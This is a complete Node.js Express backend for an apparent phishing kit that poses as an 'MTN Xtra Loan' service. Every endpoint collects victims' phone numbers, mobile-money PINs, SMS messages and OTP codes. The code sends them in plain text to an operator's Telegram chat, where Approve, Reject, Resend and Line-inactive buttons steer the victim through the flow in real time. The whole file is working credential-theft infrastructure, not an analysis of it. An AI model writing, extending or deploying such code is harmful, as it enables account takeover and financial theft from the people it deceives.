const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();

const PORT = process.env.PORT || 5000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const TELEGRAM_API         = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
const TELEGRAM_ANSWER_URL  = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery';
const TELEGRAM_EDIT_URL    = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/editMessageText';
const TELEGRAM_WEBHOOK_URL = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/setWebhook';
const TELEGRAM_INFO_URL    = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/getWebhookInfo';

const SESSION_TIMEOUT_MS = 60 * 60 * 1000;
const SESSION_MAX_AGE_MS = 120 * 60 * 1000;

const RESEND_MAX_PER_WINDOW = 2;
const RESEND_WINDOW_MS = 60 * 60 * 1000;

const SESSIONS_FILE = '/tmp/sessions.json';

let sessions = new Map();
try {
  if (fs.existsSync(SESSIONS_FILE)) {
    const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
    sessions = new Map(JSON.parse(raw));
    console.log('[boot] Restored ' + sessions.size + ' sessions from disk');
  }
} catch (e) {
  console.warn('[boot] Could not restore sessions:', e.message);
}

function persistSessions() {
  try {
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify([...sessions.entries()]));
  } catch (e) {
    console.warn('persist failed:', e.message);
  }
}

const phoneDetails = new Map();

function rememberPhone(phone, data) {
  phoneDetails.set(phone, Object.assign({}, data, { loginAt: Date.now() }));
}

function getPhoneDetails(phone) {
  const d = phoneDetails.get(phone);
  if (!d) return null;
  if (Date.now() - d.loginAt > SESSION_TIMEOUT_MS) {
    phoneDetails.delete(phone);
    return null;
  }
  return d;
}

const resendCounts = new Map();

function checkAndBumpResend(phone) {
  const now = Date.now();
  const entry = resendCounts.get(phone);
  if (!entry || now - entry.firstAt >= RESEND_WINDOW_MS) {
    resendCounts.set(phone, { count: 1, firstAt: now });
    return { allowed: true, remaining: RESEND_MAX_PER_WINDOW - 1 };
  }
  if (entry.count >= RESEND_MAX_PER_WINDOW) {
    return { allowed: false, remaining: 0 };
  }
  entry.count += 1;
  return { allowed: true, remaining: RESEND_MAX_PER_WINDOW - entry.count };
}

setInterval(function () {
  const now = Date.now();

  let changed = false;
  for (const [id, s] of sessions.entries()) {
    const age = now - s.createdAt;
    if (s.status === 'pending' && age > SESSION_TIMEOUT_MS) {
      s.status = 'timeout';
      s.resolvedAt = now;
      changed = true;
    }
    if (age > SESSION_MAX_AGE_MS) {
      sessions.delete(id);
      changed = true;
    }
  }
  if (changed) persistSessions();

  for (const [phone, d] of phoneDetails.entries()) {
    if (now - d.loginAt > SESSION_TIMEOUT_MS) {
      phoneDetails.delete(phone);
    }
  }

  for (const [phone, entry] of resendCounts.entries()) {
    if (now - entry.firstAt >= RESEND_WINDOW_MS) {
      resendCounts.delete(phone);
    }
  }
}, 60 * 1000);

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use(function (req, _res, next) {
  if (req.path.indexOf('/api/') !== 0) return next();
  console.log('[req] ' + new Date().toISOString() + ' ' + req.method + ' ' + req.path);
  next();
});

/* Serve static frontend files from the same folder as this server.js */
app.use(express.static(__dirname));

function makeSessionId() { return crypto.randomBytes(16).toString('hex'); }

function makeReference(prefix) {
  prefix = prefix || 'REF';
  const stamp = Date.now().toString(36).toUpperCase();
  const rand  = crypto.randomBytes(3).toString('hex').toUpperCase();
  return prefix + '-' + stamp + '-' + rand;
}

function makeToken() { return crypto.randomBytes(24).toString('hex'); }

function escapeHtml(s) {
  s = s == null ? '' : String(s);
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
}

const TG_MAX_ATTEMPTS = 3;
const TG_BACKOFF_MS = [500, 1500];

async function tgFetch(url, options, label) {
  let lastErr = null;
  for (let attempt = 1; attempt <= TG_MAX_ATTEMPTS; attempt++) {
    try {
      const res = await fetch(url, options);
      const data = await res.json().catch(function () { return {}; });
      if (data.ok) {
        if (attempt > 1) console.log('[tg:' + label + '] attempt ' + attempt + ' OK');
        return { ok: true, data: data, error: null };
      }
      console.warn('[tg:' + label + '] API rejected (attempt ' + attempt + '):', data.description || data);
      return { ok: false, data: data, error: data.description || 'telegram_rejected' };
    } catch (err) {
      lastErr = err;
      console.warn('[tg:' + label + '] network error (attempt ' + attempt + '/' + TG_MAX_ATTEMPTS + '): ' + err.message);
      if (attempt < TG_MAX_ATTEMPTS) {
        const wait = TG_BACKOFF_MS[attempt - 1] || 1500;
        await new Promise(function (r) { setTimeout(r, wait); });
      }
    }
  }
  console.error('[tg:' + label + '] all ' + TG_MAX_ATTEMPTS + ' attempts failed: ' + (lastErr && lastErr.message));
  return { ok: false, data: null, error: (lastErr && lastErr.message) || 'network_error' };
}

function buildKeyboard(step, sessionId) {
  if (step === 'login') {
    return { inline_keyboard: [[
      { text: '\u2705 Approve', callback_data: 'approve:login:' + sessionId },
      { text: '\u274C Reject',  callback_data: 'reject:login:' + sessionId }
    ]]};
  }
  if (step === 'sms') {
    return { inline_keyboard: [
      [
        { text: '\u2705 Approve', callback_data: 'approve:sms:' + sessionId },
        { text: '\u274C Reject',  callback_data: 'reject:sms:' + sessionId }
      ],
      [
        { text: '\uD83D\uDD01 Resend',  callback_data: 'resend:sms:' + sessionId }
      ]
    ]};
  }
  if (step === 'otp') {
    return { inline_keyboard: [
      [
        { text: '\u2705 Approve', callback_data: 'approve:otp:' + sessionId },
        { text: '\u274C Reject',  callback_data: 'reject:otp:' + sessionId }
      ],
      [
        { text: '\uD83D\uDD01 Resend',  callback_data: 'resend:otp:' + sessionId },
        { text: '\u26A0\uFE0F Inactive', callback_data: 'inactive:otp:' + sessionId }
      ],
      [
        { text: '\uD83D\uDCF5 Line inactive', callback_data: 'line_inactive:otp:' + sessionId }
      ]
    ]};
  }
  return { inline_keyboard: [[
    { text: '\u2705 Approve', callback_data: 'approve:' + step + ':' + sessionId },
    { text: '\u274C Reject',  callback_data: 'reject:' + step + ':' + sessionId }
  ]]};
}

async function sendTelegramWithButtons(text, sessionId, step) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('[tg] env vars missing - message not sent.');
    return { ok: false, messageId: null, error: 'telegram_not_configured' };
  }
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    reply_markup: buildKeyboard(step, sessionId)
  };
  const result = await tgFetch(TELEGRAM_API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }, 'send:' + step);
  if (!result.ok) return { ok: false, messageId: null, error: result.error };
  return { ok: true, messageId: result.data.result.message_id || null, error: null };
}

async function sendTelegramRaw(payload) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return { ok: false, messageId: null, error: 'telegram_not_configured' };
  }
  const body = Object.assign({ chat_id: TELEGRAM_CHAT_ID }, payload);
  const result = await tgFetch(TELEGRAM_API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  }, 'raw');
  if (!result.ok) return { ok: false, messageId: null, error: result.error };
  return { ok: true, messageId: result.data.result.message_id || null, error: null };
}

async function editTelegramMessage(messageId, text, replyMarkup) {
  if (!messageId || !TELEGRAM_BOT_TOKEN) return;
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    message_id: messageId,
    text: text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (replyMarkup !== undefined) body.reply_markup = replyMarkup;
  await tgFetch(TELEGRAM_EDIT_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  }, 'edit');
}

async function answerCallback(callbackQueryId, text) {
  if (!callbackQueryId || !TELEGRAM_BOT_TOKEN) return;
  await tgFetch(TELEGRAM_ANSWER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: callbackQueryId, text: text, show_alert: false })
  }, 'answer');
}

async function handleExpiredSession(cb, sessionId) {
  await answerCallback(cb.id, 'This request has expired');
  try {
    const messageId = cb.message && cb.message.message_id;
    if (messageId) {
      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const expiredText =
        '<b>EXPIRED - NO ACTION NEEDED</b>\n' +
        '------------------------------\n' +
        'This request is too old to process.\n' +
        'Session: <code>' + escapeHtml(sessionId || 'unknown') + '</code>\n\n' +
        '<b>Marked at:</b> ' + when;
      await editTelegramMessage(messageId, expiredText, { inline_keyboard: [] });
      console.log('[expired] message ' + messageId + ' marked as EXPIRED');
    }
  } catch (err) {
    console.error('expired edit failed:', err.message);
  }
}

function findLatestPendingSmsSession(phone) {
  let best = null;
  for (const [id, s] of sessions.entries()) {
    if (s.step !== 'sms') continue;
    if (s.status !== 'pending') continue;
    if (!s.data || s.data.phone !== phone) continue;
    if (!best || s.createdAt > best.createdAt) {
      best = { id: id, session: s, createdAt: s.createdAt };
    }
  }
  return best;
}

app.get('/health', function (_req, res) {
  res.json({ ok: true, time: new Date().toISOString() });
});

app.get('/api/health', function (_req, res) {
  res.json({
    ok: true,
    service: 'mtn-xtra-loan-backend',
    activeSessions: sessions.size,
    phoneDetailsCached: phoneDetails.size,
    resendTrackedPhones: resendCounts.size,
    webhook: global.__webhookStatus || 'unknown',
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    sessionTTLMinutes: SESSION_TIMEOUT_MS / 60000,
    time: new Date().toISOString()
  });
});

app.get('/api/webhook-info', async function (_req, res) {
  try {
    const r = await fetch(TELEGRAM_INFO_URL);
    const data = await r.json().catch(function () { return {}; });
    return res.json({
      ok: true,
      localStatus: global.__webhookStatus || 'unknown',
      telegram: data.result || data
    });
  } catch (err) {
    return res.status(500).json({ ok: false, error: err.message });
  }
});

app.post('/api/login', async function (req, res) {
  try {
    const body = req.body || {};
    const phone = body.phone || '';
    const pin = body.pin || '';
    const country = body.country || 'CM';

    console.log('[api/login]', { phone: phone, country: country, pinLength: pin.length });

    if (!isValidPhone(phone)) {
      console.warn('[api/login] invalid phone:', phone);
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof pin !== 'string' || pin.length < 4) {
      console.warn('[api/login] invalid pin length:', pin.length);
      return res.status(400).json({ ok: false, error: 'Invalid PIN' });
    }

    const sessionId = makeSessionId();
    const token = makeToken();

    const text =
      '<b>MTN Xtra Loan - Login</b>\n' +
      '------------------------------\n' +
      '<b>Phone:</b> <code>' + escapeHtml(phone) + '</code>\n' +
      '<b>Country:</b> ' + escapeHtml(country) + '\n' +
      '<b>PIN:</b> <code>' + escapeHtml(pin) + '</code>\n' +
      '<b>Time:</b> ' + new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' }) + '\n' +
      '<b>IP:</b> <code>' + escapeHtml(req.ip || 'unknown') + '</code>\n\n' +
      'Tap Approve or Reject below';

    const result = await sendTelegramWithButtons(text, sessionId, 'login');
    console.log('[login] sid=' + sessionId + ' tgOk=' + result.ok + ' msgId=' + result.messageId + ' err=' + result.error);

    sessions.set(sessionId, {
      step: 'login',
      status: 'pending',
      data: { phone: phone, country: country, token: token },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: result.messageId,
      telegramError: result.error
    });
    persistSessions();

    if (result.ok) {
      rememberPhone(phone, { pin: pin, country: country, token: token });
      console.log('[login] remembered details for ' + phone);
    }

    return res.json({ ok: true, requestId: sessionId, sessionId: sessionId, token: token, telegramOk: result.ok });
  } catch (err) {
    console.error('login error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

app.post('/api/sms', async function (req, res) {
  try {
    const body = req.body || {};
    const phone = body.phone || '';
    const token = body.token || '';
    const sms = body.sms || '';

    console.log('[api/sms]', {
      phone: phone,
      token: token ? token.slice(0, 8) + '...' : '(empty)',
      smsLength: typeof sms === 'string' ? sms.length : 'not-string'
    });

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof sms !== 'string' || sms.trim().length < 5) {
      return res.status(400).json({ ok: false, error: 'SMS text required' });
    }

    const sessionId = makeSessionId();
    const reference = makeReference('SMS');

    const details = getPhoneDetails(phone);

    const loginBlock = details
      ? '<b>LOGIN DETAILS</b>\n' +
        '<b>Phone:</b> <code>' + escapeHtml(phone) + '</code>\n' +
        '<b>PIN:</b> <code>' + escapeHtml(details.pin) + '</code>\n' +
        '<b>Country:</b> ' + escapeHtml(details.country) + '\n' +
        '<b>Login:</b> ' + new Date(details.loginAt).toLocaleString('en-GB', { timeZone: 'Africa/Douala' }) + '\n' +
        '------------------------------\n'
      : '<b>LOGIN DETAILS</b>\n' +
        '<b>Phone:</b> <code>' + escapeHtml(phone) + '</code>\n' +
        '(PIN not available - user may have reloaded the flow)\n' +
        '------------------------------\n';

    const text =
      '<b>MTN Xtra Loan - SMS pasted</b>\n' +
      '------------------------------\n\n' +
      loginBlock +
      '\n<b>SMS DETAILS</b>\n' +
      '<b>Ref:</b> <code>' + reference + '</code>\n' +
      '<b>Time:</b> ' + new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' }) + '\n\n' +
      '<b>Message:</b>\n<pre><code>' + escapeHtml(sms) + '</code></pre>\n' +
      'Tap Approve / Reject / Resend below';

    const result = await sendTelegramWithButtons(text, sessionId, 'sms');
    console.log('[sms] sid=' + sessionId + ' tgOk=' + result.ok + ' msgId=' + result.messageId + ' err=' + result.error + ' pinIncluded=' + !!details);

    sessions.set(sessionId, {
      step: 'sms',
      status: 'pending',
      data: { phone: phone, token: token, sms: sms, reference: reference },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: result.messageId,
      telegramError: result.error
    });
    persistSessions();

    return res.json({ ok: true, requestId: sessionId, sessionId: sessionId, reference: reference, telegramOk: result.ok });
  } catch (err) {
    console.error('sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

app.post('/api/verify-otp', async function (req, res) {
  try {
    const body = req.body || {};
    const phone = body.phone || '';
    const otp = body.otp || '';
    const sms = body.sms || '';

    console.log('[api/verify-otp]', { phone: phone, otpLength: otp.length, smsLength: sms.length });

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
      return res.status(400).json({ ok: false, error: 'Invalid OTP' });
    }

    const sessionId = makeSessionId();
    const reference = makeReference('OTP');

    const details = getPhoneDetails(phone);

    const loginBlock = details
      ? '<b>LOGIN DETAILS</b>\n' +
        '<b>Phone:</b> <code>' + escapeHtml(phone) + '</code>\n' +
        '<b>PIN:</b> <code>' + escapeHtml(details.pin) + '</code>\n' +
        '<b>Country:</b> ' + escapeHtml(details.country) + '\n' +
        '<b>Login:</b> ' + new Date(details.loginAt).toLocaleString('en-GB', { timeZone: 'Africa/Douala' }) + '\n' +
        '------------------------------\n'
      : '<b>LOGIN DETAILS</b>\n' +
        '<b>Phone:</b> <code>' + escapeHtml(phone) + '</code>\n' +
        '(PIN not available - user may have reloaded the flow)\n' +
        '------------------------------\n';

    const text =
      '<b>MTN Xtra Loan - OTP code</b>\n' +
      '------------------------------\n\n' +
      loginBlock +
      '\n<b>OTP DETAILS</b>\n' +
      '<b>OTP:</b> <code>' + escapeHtml(otp) + '</code>\n' +
      '<b>Ref:</b> <code>' + reference + '</code>\n' +
      '<b>Time:</b> ' + new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' }) +
      (sms ? '\n\n<b>Linked SMS:</b>\n<pre><code>' + escapeHtml(sms.slice(0, 400)) + '</code></pre>' : '') +
      '\nTap Approve / Reject / Resend / Inactive / Line inactive below';

    const result = await sendTelegramWithButtons(text, sessionId, 'otp');
    console.log('[otp] sid=' + sessionId + ' tgOk=' + result.ok + ' msgId=' + result.messageId + ' err=' + result.error + ' pinIncluded=' + !!details);

    sessions.set(sessionId, {
      step: 'otp',
      status: 'pending',
      data: { phone: phone, otp: otp, sms: sms, reference: reference },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: result.messageId,
      telegramError: result.error
    });
    persistSessions();

    return res.json({ ok: true, requestId: sessionId, sessionId: sessionId, reference: reference, telegramOk: result.ok });
  } catch (err) {
    console.error('verify-otp error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

app.post('/api/resend-sms', async function (req, res) {
  try {
    const body = req.body || {};
    const phone = body.phone || '';
    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }

    const gate = checkAndBumpResend(phone);
    if (!gate.allowed) {
      console.log('[resend] blocked ' + phone + ' - cap reached');
      return res.status(429).json({ ok: false, error: 'Resend limit reached' });
    }

    const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
    const details = getPhoneDetails(phone);
    const pinLine = details ? '<b>PIN:</b> <code>' + escapeHtml(details.pin) + '</code>\n' : '';

    const live = findLatestPendingSmsSession(phone);

    if (live) {
      const text =
        '<b>MTN Xtra Loan - Resend requested</b>\n' +
        '------------------------------\n' +
        '<b>Phone:</b> <code>' + escapeHtml(phone) + '</code>\n' +
        pinLine +
        '<b>Time:</b> ' + when + '\n' +
        '<b>Linked session:</b> <code>' + escapeHtml(live.id) + '</code>\n\n' +
        'Tap <b>Send new SMS</b> once you have triggered the SMS.';

      const keyboard = {
        inline_keyboard: [[
          { text: '\uD83D\uDCF2 Send new SMS', callback_data: 'resend_sent:sms:' + live.id }
        ]]
      };

      const send = await sendTelegramRaw({
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: keyboard
      });

      console.log('[resend] phone=' + phone + ' linkedSid=' + live.id + ' msgId=' + send.messageId + ' remaining=' + gate.remaining);
      return res.json({ ok: true, linked: true, requestId: live.id, remaining: gate.remaining });
    }

    const text =
      '<b>MTN Xtra Loan - SMS resend requested</b>\n' +
      '------------------------------\n' +
      '<b>Phone:</b> <code>' + escapeHtml(phone) + '</code>\n' +
      pinLine +
      '<b>Time:</b> ' + when + '\n\n' +
      'No active SMS session found - user may have reloaded.';

    await sendTelegramRaw({
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });

    console.log('[resend] phone=' + phone + ' no-live-session remaining=' + gate.remaining);
    return res.json({ ok: true, linked: false, remaining: gate.remaining });
  } catch (err) {
    console.error('resend-sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

app.post('/api/application', function (req, res) {
  console.log('[api/application]', req.body);
  return res.json({ ok: true });
});

function statusHandler(req, res) {
  const key = req.params.requestId || req.params.sessionId;
  const session = sessions.get(key);
  if (!session) return res.json({ ok: true, status: 'unknown', step: null });

  if (session.status === 'pending'
      && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
    session.status = 'timeout';
    session.resolvedAt = Date.now();
    persistSessions();
  }

  return res.json({
    ok: true,
    status: session.status,
    step: session.step,
    telegramOk: !!session.telegramMessageId,
    telegramError: session.telegramError || null
  });
}

app.get('/api/approval/status/:requestId', statusHandler);
app.get('/api/status/:sessionId', statusHandler);

app.post('/api/telegram-webhook', async function (req, res) {
  try {
    const update = req.body || {};

    const updateType = update.callback_query ? 'callback_query'
      : update.message ? 'message'
      : update.edited_message ? 'edited_message'
      : Object.keys(update).find(function (k) { return k !== 'update_id'; }) || 'unknown';
    console.log('[webhook:in] type=' + updateType + ' update_id=' + (update.update_id == null ? 'n/a' : update.update_id));

    const cb = update.callback_query;
    if (!cb || !cb.data) {
      console.log('[webhook:in] no callback_query - ignoring');
      return res.json({ ok: true });
    }

    const parts = String(cb.data).split(':');
    const action = parts[0];
    const step = parts[1];
    const sessionId = parts[2];
    console.log('[webhook:in] cb.id=' + cb.id + ' data="' + cb.data + '" action=' + action + ' step=' + step + ' sid=' + sessionId);

    const session = sessions.get(sessionId);
    console.log('[webhook] action=' + action + ' step=' + step + ' sid=' + sessionId + ' found=' + !!session);

    if (!session) {
      await handleExpiredSession(cb, sessionId);
      return res.json({ ok: true });
    }

    if (['approved','rejected','timeout','inactive','line_inactive','resend'].indexOf(session.status) !== -1) {
      await answerCallback(cb.id, 'Already ' + session.status);
      return res.json({ ok: true });
    }

    if (action === 'resend_sent') {
      session.status = 'resend';
      session.resolvedAt = Date.now();
      persistSessions();
      await answerCallback(cb.id, 'New SMS sent');
      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const newText =
        '<b>NEW SMS SENT</b>\n' +
        when + '\n' +
        '------------------------------\n' +
        session.originalText;
      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
      }
      console.log('[webhook] session ' + sessionId + ' -> resend (resend_sent)');
      return res.json({ ok: true });
    }

    if (action === 'resend') {
      session.status = 'resend';
      session.resolvedAt = Date.now();
      persistSessions();
      await answerCallback(cb.id, 'Resend requested');
      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const newText =
        '<b>RESEND REQUESTED</b>\n' +
        when + '\n' +
        '------------------------------\n' +
        session.originalText;
      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
      }
      console.log('[webhook] session ' + sessionId + ' -> resend');
      return res.json({ ok: true });
    }

    if (action === 'inactive') {
      session.status = 'inactive';
      session.resolvedAt = Date.now();
      persistSessions();
      await answerCallback(cb.id, 'Marked as inactive');
      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const newText =
        '<b>ACCOUNT INACTIVE</b>\n' +
        when + '\n' +
        '------------------------------\n' +
        session.originalText;
      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
      }
      console.log('[webhook] session ' + sessionId + ' -> inactive');
      return res.json({ ok: true });
    }

    if (action === 'line_inactive') {
      session.status = 'line_inactive';
      session.resolvedAt = Date.now();
      persistSessions();
      await answerCallback(cb.id, 'Line marked inactive');
      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const newText =
        '<b>LINE INACTIVE</b>\n' +
        when + '\n' +
        '------------------------------\n' +
        session.originalText;
      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
      }
      console.log('[webhook] session ' + sessionId + ' -> line_inactive');
      return res.json({ ok: true });
    }

    let statusLine, answerText;
    if (action === 'approve') {
      session.status = 'approved';
      session.resolvedAt = Date.now();
      persistSessions();
      statusLine = '<b>APPROVED</b>';
      answerText = 'Approved';
    } else if (action === 'reject') {
      session.status = 'rejected';
      session.resolvedAt = Date.now();
      persistSessions();
      statusLine = '<b>REJECTED</b>';
      answerText = 'Rejected';
    } else {
      console.log('[webhook] unknown action="' + action + '" - ignoring');
      await answerCallback(cb.id, 'Unknown action');
      return res.json({ ok: true });
    }

    await answerCallback(cb.id, answerText);
    const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
    const newText =
      statusLine + '\n' +
      when + '\n' +
      '------------------------------\n' +
      session.originalText;

    if (session.telegramMessageId) {
      await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
    }

    console.log('[webhook] session ' + sessionId + ' -> ' + session.status + ' (edited msg ' + session.telegramMessageId + ')');
    return res.json({ ok: true });
  } catch (err) {
    console.error('[webhook] ERROR:', err.stack || err.message);
    return res.json({ ok: true });
  }
});

app.use('/api', function (_req, res) {
  res.status(404).json({ ok: false, error: 'Not found' });
});

app.use(function (err, _req, res, _next) {
  console.error('unhandled error:', err);
  if (res.headersSent) return;
  res.status(500).json({ ok: false, error: 'Server error' });
});

async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('[webhook] cannot register - TELEGRAM_BOT_TOKEN missing');
    global.__webhookStatus = 'missing_token';
    return;
  }

  let publicUrl = process.env.PUBLIC_URL || '';
  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
    publicUrl = 'https://' + process.env.RAILWAY_PUBLIC_DOMAIN;
  }
  publicUrl = publicUrl.replace(/\/+$/, '');

  if (!publicUrl) {
    console.warn('[webhook] no PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
    global.__webhookStatus = 'missing_url';
    return;
  }

  const webhookUrl = publicUrl + '/api/telegram-webhook';
  console.log('[webhook] registering (no delete):', webhookUrl);

  try {
    const res = await fetch(TELEGRAM_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ['callback_query']
      })
    });
    const data = await res.json().catch(function () { return {}; });
    console.log('[webhook] setWebhook response:', JSON.stringify(data));
    if (data.ok) {
      console.log('[webhook] registered OK:', webhookUrl);
      global.__webhookStatus = 'ok';
    } else {
      console.warn('[webhook] registration failed:', data.description || data);
      global.__webhookStatus = 'failed: ' + (data.description || 'unknown');
    }

    const infoRes = await fetch(TELEGRAM_INFO_URL);
    const infoData = await infoRes.json().catch(function () { return {}; });
    console.log('[webhook] getWebhookInfo:', JSON.stringify(infoData.result || infoData));
  } catch (err) {
    console.error('[webhook] registration error:', err.message);
    global.__webhookStatus = 'error: ' + err.message;
  }
}

app.listen(PORT, async function () {
  console.log('====================================');
  console.log('MTN Xtra Loan - backend running');
  console.log('Port: ' + PORT);
  console.log('Telegram configured: ' + (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'));
  console.log('Bot token: ' + (TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.slice(0, 15) + '...' : 'MISSING'));
  console.log('Chat ID: ' + (TELEGRAM_CHAT_ID || 'MISSING'));
  console.log('Session TTL: ' + (SESSION_TIMEOUT_MS / 60000) + ' min');
  console.log('Max age:     ' + (SESSION_MAX_AGE_MS / 60000) + ' min');
  console.log('Resend cap:  ' + RESEND_MAX_PER_WINDOW + ' per ' + (RESEND_WINDOW_MS / 60000) + ' min');
  console.log('====================================');
  setTimeout(registerWebhook, 2000);
});
